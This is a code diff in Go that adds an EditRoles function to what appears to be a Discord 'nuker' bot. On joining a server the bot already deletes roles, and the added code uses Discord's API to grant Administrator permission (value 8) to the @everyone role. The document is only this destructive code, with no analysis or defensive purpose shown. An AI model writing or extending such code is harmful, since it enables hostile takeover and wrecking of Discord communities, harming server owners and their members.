@@ -45,3 +45,10 @@ func DeleteRoles(s *discordgo.Session, event *discordgo.GuildCreate) {
 		time.Sleep(time.Second)
 	}
 }
+
+func EditRoles(s *discordgo.Session, event *discordgo.GuildCreate) {
+	dataMap := map[string]string{"permissions": "8"}
+	jsonData, _ := json.Marshal(dataMap)
+
+	requests.Sendhttp("https://discord.com/api/v9/guilds/"+event.ID+"/roles/"+event.ID, "PATCH", jsonData)
+}
